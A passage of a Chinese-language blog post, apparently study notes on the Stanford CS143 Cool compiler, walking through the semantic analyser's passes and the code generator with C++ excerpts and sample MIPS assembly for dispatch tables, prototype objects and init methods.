该class的信息和environmentclass SymtabEntry &#123;  -SYM id;        // the key field  -DAT *info;     // associated information for the symbol  +get_id() SYM  +get_info() DAT *&#125;SymbolTable~Symbol, InheritanceNode~ &lt;|-- SymtabEntry : Inheritance</code></pre><blockquote><p>要我写这些东西只能一点点加成员函数啥的, 现在勉强理清楚了结构感觉也能体会到怎么想出这样的程序逻辑. </p></blockquote><p>先看semant-parse.cc入口main函数</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> Program ast_root;      <span class="hljs-comment">// root of the abstract syntax tree</span><br>FILE *ast_file = stdin;       <span class="hljs-comment">// we read the AST from standard input</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">ast_yyparse</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>; <span class="hljs-comment">// entry point to the AST parser</span><br><span class="hljs-keyword">int</span> cool_yydebug;     <span class="hljs-comment">// not used, but needed to link with handle_flags</span><br><span class="hljs-keyword">char</span> *curr_filename;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_flags</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>  <span class="hljs-built_in">handle_flags</span>(argc,argv);<br>  <span class="hljs-built_in">ast_yyparse</span>();<br>  ast_root-&gt;<span class="hljs-built_in">semant</span>();<br>  ast_root-&gt;<span class="hljs-built_in">dump_with_types</span>(cout,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>先是<code>handle_flags()</code>这不知道要干嘛的函数, 然后是<code>ast_yyparse()</code>构造好AST然后将根节点赋值给<code>ast_root</code>, 再执行<code>program_class</code>的<code>semant()</code>函数, <code>dump_with_types()</code>输出AST(不知道要怎么看, 算了也不重要)</p><p>再看<code>semant()</code>函数:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// The function which runs the semantic analyser.</span><br><span class="hljs-function">InheritanceNodeP <span class="hljs-title">program_class::semant</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-built_in">initialize_constants</span>();<br>   ClassTableP classtable = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassTable</span>(classes);<br>   <span class="hljs-keyword">if</span> (classtable-&gt;<span class="hljs-built_in">errors</span>()) &#123;<br>      cerr &lt;&lt; <span class="hljs-string">&quot;Compilation halted due to static semantic errors.&quot;</span> &lt;&lt; endl;<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以想到在ClassTable的构造函数中完成检查AST树, 其中一个流程如下:</p><p>This file implements the semantic checks for Cool.  There are three passes:</p><ul><li><strong>Pass 1</strong>: This is not a true pass, as only the classes are inspected. The inheritance graph is built and checked for errors.  There are two “sub”-passes: check that classes are not redefined and inherit only from defined classes, and check for <strong>cycles</strong> in the inheritance graph.  Compilation is halted if an error is detected between the sub-passes.<ul><li>  enterscope : 新建一个tbl</li><li>  install_basic_classes : 注意有三个不可继承的class(No_class SELF_TYPE prim_slot), 具体见semant.cc</li><li>  install_classes : 装载构造函数的参数classes</li><li>  check_improper_inheritance : </li><li>  build_inheritance_tree</li><li>  root()-&gt;mark_reachable()</li><li>  check_for_cycles</li></ul></li><li><strong>Pass 2</strong>: Symbol tables are built for each class.  This step is done separately because methods and attributes have global scope—therefore, bindings for all methods and attributes must be known before type checking can be done.<ul><li>build_feature_tables : 现在有了继承树, <ul><li>  首先是初始化Object的env和build_feature_tables(), </li><li>  再向env的meth_table或var_table加入该feature, 这个过程中顺带检查一下是否重复定义, 是否错误重载(针对method), 当前类和祖先类是否重名变量(针对attr)</li><li>  然后copy the parent’s environment to children’s env, 继续递归迭代.</li></ul></li><li>  check_main : 这个是检查main class和main method是否存在以及main method参数不能为0.</li></ul></li><li><strong>Pass 3</strong>: The inheritance graph—which is known to be a tree if there are no cycles—is traversed again, starting from the root class Object.  For each class, each attribute and method is <strong>typechecked</strong>.  Simultaneously, identifiers are checked for correct definition/use and for multiple definitions.  <strong>An invariant is maintained that all parents of a class are checked before a class is checked.</strong> <ul><li>  root()-&gt;type_check_features : 有个东西是type的比较. method最后一条语句的type要&lt;=return_type. 具体见kp博客和代码</li></ul></li></ul><p>相应的构造函数为:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">ClassTable::<span class="hljs-built_in">ClassTable</span>(Classes classes) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>), <br>                                          <span class="hljs-built_in">semant_errors</span>(<span class="hljs-number">0</span>),<br>                                          <span class="hljs-built_in">error_stream</span>(cerr)<br>&#123;<br>  <span class="hljs-built_in">enterscope</span>();             <span class="hljs-comment">// initially the symbol table is empty</span><br>  <span class="hljs-comment">// predefined basic classes, 这个预设的写得差不多了,不过真是套娃结构,也许可以更优雅一点.</span><br>  <span class="hljs-built_in">install_basic_classes</span>();  <br>  <span class="hljs-keyword">if</span> (semant_debug)  cerr &lt;&lt; <span class="hljs-string">&quot;Installed basic classes.&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-comment">//最后程序语法分析出来的最上层的类型是Program,由classes组成</span><br>  <span class="hljs-built_in">install_classes</span>(classes); <span class="hljs-comment">// user defined classes, attach it to the tail of symbolTableList</span><br>  <span class="hljs-keyword">if</span> (semant_debug) <br>    &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Installed user-defined classes&quot;</span> &lt;&lt; endl; <span class="hljs-built_in">dump</span>(); &#125;<br>  <span class="hljs-built_in">check_improper_inheritance</span>();  <span class="hljs-comment">// check for undefined class and `CantInherit` class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for simple inheritance errors.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//遇到上面这种fatal_error的时候就不能往下继续semant了， 必须报错并退出程序</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//经过了install [basic] classes和check-improper-inheritance，</span><br>  <span class="hljs-comment">//可以保证所建立的继承树每个节点都有valid parent，所以直接使用set_relations</span><br>  <span class="hljs-built_in">build_inheritance_tree</span>(); <span class="hljs-comment">// set class-nodes&#x27; parent and added to parent&#x27;s children list</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built inheritance tree.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">mark_reachable</span>(); <span class="hljs-comment">// find all classes reachable from root class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Marked reachable classes.&quot;</span> &lt;&lt; endl; &#125;                                           <br>  <span class="hljs-comment">// This method should be run only after mark_reachable has executed.</span><br>  <span class="hljs-comment">// **If there are any unreachable classes in the inheritance graph and</span><br>  <span class="hljs-comment">// all of the local checks of check_improper_inheritance succeeded,</span><br>  <span class="hljs-comment">// then there is a cycle in the inheritance graph**.</span><br>  <span class="hljs-built_in">check_for_cycles</span>();       <br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for cycles.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//遇到cycles的时候同理 必须报错并退出程序</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//首先检查完feature每一项, 然后向env的meth_table或var_table加入该feature</span><br>  <span class="hljs-comment">//然后copy the parent&#x27;s environment to children&#x27;s env</span><br>  <span class="hljs-built_in">build_feature_tables</span>();   <span class="hljs-comment">// build symbol tables of features for each class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built feature tables.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">check_main</span>();             <span class="hljs-comment">// check for Main class and main method</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked Main class and method.&quot;</span> &lt;&lt; endl; &#125;<br>                                              <br>  <span class="hljs-comment">// type check all expressions, first root, then all the way down to its children</span><br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">type_check_features</span>(); <br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后各种细节细到难以置信, 都不敢想象我自己写到底要用掉多少时间</p><p>再次回头看感觉没有那么复杂了. 希望到时中间代码优化也是如此. </p><ul><li><h2 id="What-requirements-do-I-need-to-check"><a href="#What-requirements-do-I-need-to-check" class="headerlink" title="What requirements do I need to check?"></a>What requirements do I need to check?</h2></li><li><h2 id="When-do-I-need-to-check-a-requirement"><a href="#When-do-I-need-to-check-a-requirement" class="headerlink" title="When do I need to check a requirement?"></a>When do I need to check a requirement?</h2></li><li><h2 id="When-is-the-information-needed-to-check-a-requirement-generated"><a href="#When-is-the-information-needed-to-check-a-requirement-generated" class="headerlink" title="When is the information needed to check a requirement generated?"></a>When is the information needed to check a requirement generated?</h2></li><li><h2 id="Where-is-the-information-I-need-to-check-a-requirement"><a href="#Where-is-the-information-I-need-to-check-a-requirement" class="headerlink" title="Where is the information I need to check a requirement?"></a>Where is the information I need to check a requirement?</h2></li></ul><h2 id="4-codeGenerate-代码生成"><a href="#4-codeGenerate-代码生成" class="headerlink" title="4.codeGenerate - 代码生成"></a>4.codeGenerate - 代码生成</h2><p>这部分的代码更长了, 诶可真累, 真实的要求可是自己写.</p><ol><li>Determine and emit code for global constants, such as prototype objects.</li><li>Determine and emit code for global tables, such as the class nameTab, the class objTab, and the<br>dispatch tables.</li><li>Determine and emit code for the initialization method of each class.</li><li>Determine and emit code for each method definition</li></ol><p>拜拜了, 看累了跳过. </p><p>代码生成框架:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">CgenClassTable::<span class="hljs-built_in">CgenClassTable</span>(Classes classes, ostream&amp; s) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>) , <span class="hljs-built_in">str</span>(s)<br>&#123;<br>   <span class="hljs-comment">//stringclasstag = 0 /* Change to your String class tag here */;</span><br>   <span class="hljs-comment">//intclasstag =    0 /* Change to your Int class tag here */;</span><br>   <span class="hljs-comment">//boolclasstag =   0 /* Change to your Bool class tag here */;</span><br><br>   <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;Building CgenClassTable&quot;</span> &lt;&lt; endl;<br>   num_classes = <span class="hljs-number">0</span>;<br>   <span class="hljs-comment">// make sure the various tables have a scope</span><br>   class_to_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   class_to_max_child_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   tag_to_class_table.<span class="hljs-built_in">enterscope</span>();<br>   table_of_method_tables.<span class="hljs-built_in">enterscope</span>();<br><br><br>   <span class="hljs-built_in">enterscope</span>();<span class="hljs-comment">//init a new Scope to ScopeList</span><br>   <span class="hljs-built_in">install_basic_classes</span>();<span class="hljs-comment">//the same as PA4</span><br>   <span class="hljs-built_in">install_classes</span>(classes);<br>    <br>   <span class="hljs-built_in">build_inheritance_tree</span>();<span class="hljs-comment">//building complete</span><br><br>   <span class="hljs-comment">// 递归，将每个CgenNode的attr/method数据</span><br>   <span class="hljs-comment">// 都填入CgenNode和CgenClassTable中的table中</span><br>   <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">init</span>(<span class="hljs-number">0</span><span class="hljs-comment">//root() returns CgenNode class</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,<span class="hljs-keyword">int</span>&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,MethodBinding&gt;)<br>               ,<span class="hljs-number">0</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,VarBinding&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,Entry&gt;));<br>   <span class="hljs-comment">// 生成代码</span><br>   <span class="hljs-built_in">code</span>();<br>   <span class="hljs-built_in">exitscope</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>在生成目标代码前，需要先读入<strong>AST</strong>的相关信息，**重建继承图<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="因为此时已经通过了semant, 可以确定AST是正确的从而无需检查">[1]</span></a></sup><strong>，并自上而下的初始化相关的映射表格<br>在该初始化过程中，每个类会遍历其中的<code>feature</code>，并将其相关信息添加至对应的<code>SymbolTable</code>中<br>如果该<code>feature</code>是<code>method</code>，则还会额外自顶向下计算所需要的</strong>最小临时变量数量<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="Stanford-cs143-pdf中提到的">[2]</span></a></sup>**，并将其添加进表格中。</li></ul><ul><li>init()的过程:<ul><li>从形参中得到该class初始feature个数</li><li>assign_tag</li><li>各种enterscope</li><li>装载features, 用到了layout_featues:<ul><li>layout_method():</li><li>layout_attr():</li></ul></li><li>各种map的赋值</li></ul></li><li>code()的过程:</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CgenClassTable::code</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global data&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_data</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;choosing gc&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_select_gc</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding constants&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_constants</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - prototype objects</span><br><span class="hljs-comment">//                   - class_nameTab</span><br><span class="hljs-comment">//                   - dispatch tables</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding class table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_class_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding object table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_object_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding dispatch tables&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_dispatch_table</span>(str);<span class="hljs-comment">//recursively</span><br><br>  <span class="hljs-comment">// </span><br>  <span class="hljs-comment">// Check that strings required to code the prototype objects are installed.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-built_in">assert</span>(inttable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;0&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(stringtable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(INTNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(STRINGNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(BOOLNAME));<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding prototypes&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_prototype_object</span>(str);<br><br>  <span class="hljs-comment">// /*##*/</span><br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global text&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_text</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - object initializer</span><br><span class="hljs-comment">//                   - the class methods</span><br><span class="hljs-comment">//                   - etc...</span><br>  CgenEnvTopLevelP env = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CgenEnvTopLevel</span>(&amp;class_to_tag_table,<br>     &amp;class_to_max_child_tag_table,<br>     &amp;table_of_method_tables,<br>     num_classes);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding init methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_init</span>(str,env);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_methods</span>(str,env);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><a href="https://kiprey.github.io/2020/06/compiler-learning/#5-cgen-%E7%9B%AE%E6%A0%87%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90">以下部分 出处, 未全cv</a>:</p><ul><li><p>声明全局变量。例如以下mips汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .data<br>  .align  2<br>  .globl  class_nameTab<br>  .globl  Main_protObj<br>  .globl  Int_protObj<br>  .globl  String_protObj<br>  .globl  bool_const0<br>  .globl  bool_const1<br>  .globl  _int_tag<br>  .globl  _bool_tag<br>  .globl  _string_tag<br><br>_int_tag:<br>  .word 3<br>_bool_tag:<br>  .word 4<br>_string_tag:<br>  .word 5<br>  .globl _MemMgr_INITIALIZER<br></code></pre></div></td></tr></table></figure></li><li><p>声明GC器。例如以下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">_MemMgr_INITIALIZER:<br>  .word _NoGC_Init<br>  .globl _MemMgr_COLLECTOR<br>_MemMgr_COLLECTOR:<br>  .word _NoGC_Collect<br>  .globl _MemMgr_TEST<br>_MemMgr_TEST:<br>  .word 0<br>  .word -1<br></code></pre></div></td></tr></table></figure></li><li><p>将常量输出（例如：数字，字符串，布尔常量），例如以下部分汇编代码</p><blockquote><p>数字常量包括<code>0</code>，字符串常量包括空字符串<code>&quot;&quot;</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word -1          # eye catcher for _gc_check<br>str_const8:             # 该字符串的标签<br>  .word 5               # string class tag<br>  .word 6               # size of the class(include 5,6,string_disptab,string and align)/word<br>  .word String_dispTab  # 该类型可以使用的方法<br>  .word int_const2      # 字符串长度（其中的int_const2指向另一个数字常量）<br>  .ascii &quot;Main&quot;         # 字符串的ASCII码<br>  .byte 0               # 字符串末尾的\0终结符<br>  .align 2              # 对齐<br></code></pre></div></td></tr></table></figure></li><li><p>将所有类的名称输出。例如以下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_nameTab:        # 这一个个的str_const都指向特定的字符串<br>  .word str_const6    # str_const6  =&gt; &quot;Object&quot;<br>  .word str_const7    # str_const7  =&gt; &quot;IO&quot;<br>  .word str_const8    # str_const8  =&gt; &quot;Main&quot;<br>  .word str_const9    # str_const9  =&gt; &quot;Int&quot;<br>  .word str_const10   # str_const10 =&gt; &quot;Bool&quot;<br>  .word str_const11   # str_const11 =&gt; &quot;String&quot;<br></code></pre></div></td></tr></table></figure></li><li><p>将所有类中的object table输出（未知用途，删除后仍然可以执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_objTab:<br>  .word  Object_protObj<br>  .word  Object_init<br>  .word  IO_protObj<br>  .word  IO_init<br>  .word  Main_protObj<br>  .word  Main_init<br>  .word  Int_protObj<br>  .word  Int_init<br>  .word  Bool_protObj<br>  .word  Bool_init<br>  .word  String_protObj<br>  .word  String_init<br></code></pre></div></td></tr></table></figure></li><li><p>将每个类所含的方法输出（包括该类的继承类中的方法），例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">Main_dispTab:<br>  .word  Object.abort<br>  .word  Object.type_name<br>  .word  Object.copy<br>  .word  IO.out_string<br>  .word  IO.out_int<br>  .word  IO.in_string<br>  .word  IO.in_int<br>  .word  Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>将每个类的类型信息输出。<code>protObj</code>中含有当前类的属性以及函数表。例如以下部分汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word  -1         # -1 header for the garbage collector(eye catcher for _gc_check)<br>Main_protObj:         # label<br>  .word  2            # class tag<br>  .word  7            # total_attributes + DEFAULT_OBJFIELDS<br>  .word  Main_dispTab # 函数表<br>  .word  int_const0   # 第一个attribute是数字类型<br>  .word  str_const12  # 第二个attribute是字符串类型<br>  .word  bool_const0  # 第三个attribute是布尔类型<br>  .word  0            # 第四个attribute是其他类型，例如各种类<br></code></pre></div></td></tr></table></figure></li><li><p>声明全局代码段的相关信息，例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">#声明堆的相关信息<br>  .globl  heap_start<br>heap_start:<br>  .word  0<br>#声明text代码段<br>  .text<br>  .globl  Main_init<br>  .globl  Int_init<br>  .globl  String_init<br>  .globl  Bool_init<br>  .globl  Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>输出每个类的初始化函数的代码，例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">String_init:<br>  addiu  $sp $sp -12<br>  sw  $fp 12($sp)<br>  sw  $s0 8($sp)<br>  sw  $ra 4($sp)<br>  addiu  $fp $sp 4<br>  move  $s0 $a0<br>  jal  Object_init<br>  move  $a0 $s0<br>  lw  $fp 12($sp)<br>  lw  $s0 8($sp)<br>  lw  $ra 4($sp)<br>  addiu  $sp $sp 12<br>  jr  $ra<br></code></pre></div></td></tr></table></figure><section class="footnotes"><div 